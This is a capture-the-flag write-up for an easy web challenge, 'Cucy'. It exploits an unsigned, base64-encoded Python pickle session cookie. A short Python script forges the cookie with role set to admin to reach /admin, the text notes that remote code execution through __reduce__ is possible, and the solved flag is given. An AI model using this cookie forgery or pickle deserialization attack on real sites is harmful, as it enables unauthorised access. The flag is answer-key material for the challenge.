# Cucy

- **Lab / Category:** Web
- **Points:** 110
- **Difficulty:** easy
- **Status:** ✅ SOLVED

## Vulnerability — insecure deserialization of an unsigned pickle session cookie
The login page advertises demo creds (`user / user123`). After login the server sets a
`session_token` cookie that is **base64(pickle.dumps(dict))** with no signature:

```python
{'username':'user','role':'user','created_at':..., 'expires_at':..., 'is_authenticated':True}
```

`/admin` checks `role == 'admin'` from that pickled dict. Since it is client-controlled and
unsigned, flip the role and re-encode.

## Exploit
```python
r = s.post(B+"/login", data={"username":"user","password":"user123"})
obj = pickle.loads(base64.b64decode(s.cookies["session_token"]))
obj['role'] = 'admin'
forged = base64.b64encode(pickle.dumps(obj)).decode()
print(requests.get(B+"/admin", cookies={"session_token": forged}).text)
```

(Because the cookie is `pickle`, RCE via `__reduce__` is also possible, but a simple role flip
suffices to read `/admin`.)

## Flag
`FlagY{55562d0d454302d82f237b93602c7ea6}`
